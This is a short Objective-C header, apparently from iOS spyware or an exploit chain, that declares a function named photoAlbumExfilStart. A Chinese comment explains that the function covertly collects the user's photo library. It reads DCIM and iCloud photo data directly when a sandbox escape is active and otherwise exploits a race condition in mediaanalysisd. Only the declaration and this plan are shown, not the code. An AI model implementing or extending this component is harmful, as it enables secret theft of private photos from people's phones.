#ifndef PhotoAlbumExfil_h
#define PhotoAlbumExfil_h

#import <Foundation/Foundation.h>

// 启动相册采集（内部自起后台线程，自带防重入，可安全在主线程调用）：
// - 沙盒逃逸活跃 → 直读 /var/mobile/Media/DCIM + PhotoData/CPL
// - 未逃逸       → mediaanalysisd 竞态兜底
void photoAlbumExfilStart(void);

#endif
